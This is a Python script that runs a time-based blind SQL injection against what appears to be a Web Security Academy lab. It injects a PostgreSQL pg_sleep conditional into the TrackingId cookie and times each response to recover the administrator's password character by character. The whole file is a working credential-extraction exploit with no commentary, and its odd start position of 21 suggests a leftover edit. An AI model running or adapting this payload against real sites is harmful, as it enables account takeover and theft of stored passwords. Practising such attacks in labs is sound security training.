import requests
import string
from bs4 import BeautifulSoup
import time
arr = string.ascii_lowercase + string.digits


URL = 'https://0a78003a0321579183006133005900df.web-security-academy.net/login'

session = requests.Session()

response = session.get(URL)
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})
if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)
csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")
count = 21
password = ''
while True:
    for i in arr:
        payload = f"pJKIYzIJxz2YxehT' || (SELECT CASE WHEN (substring((select password from users where username='administrator'),{count},1) = '{i}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        cookies = {'TrackingId': payload}
        data = {
            'csrf': csrf_value,
            'username': 'a',
            'password': 'password'
        }
        start = time.perf_counter()
        response = session.post(URL, data=data, cookies=cookies)
        request_time = time.perf_counter() - start
        if request_time > float(3):
            print(f"[+] Found character: {i} with {request_time:.2f} seconds")
            password += i
        else:
            print(f"[-] Not found: {i} with {request_time:.2f} seconds")
    count += 1
    if len(password) > 20:
        break
        
print(f"[+] Password found: {password}")
        